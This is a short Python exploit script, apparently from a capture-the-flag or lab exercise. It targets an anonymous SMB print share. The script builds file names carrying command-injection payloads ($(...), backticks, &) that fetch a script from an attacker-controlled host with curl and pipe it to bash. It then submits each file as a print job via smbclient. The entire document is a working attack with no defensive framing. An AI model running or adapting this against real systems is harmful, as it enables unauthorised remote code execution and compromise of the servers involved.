import os
import subprocess
import time

LHOST = "10.10.14.180"
PORT = "8000"
TARGET = "10.129.244.177"
SHARE = "HP-Reception"
D = "/tmp/print_inj_test2"
os.makedirs(D, exist_ok=True)

names = [
    f"a$(curl {LHOST}:{PORT}|bash).txt",
    f"a`curl {LHOST}:{PORT}|bash`.txt",
    f"a&curl {LHOST}:{PORT}|bash&.txt",
]

for n in names:
    path = os.path.join(D, n)
    with open(path, "wb") as f:
        f.write(b"test print job\n")

for fname in names:
    full = os.path.join(D, fname)
    print(f"=== submitting: {fname!r} ===")
    cmd = ["smbclient", "-N", f"//{TARGET}/{SHARE}", "-c", f'print "{full}"']
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    print("STDOUT:", r.stdout.strip())
    print("STDERR:", r.stderr.strip())
    time.sleep(5)

print("ALL DONE")
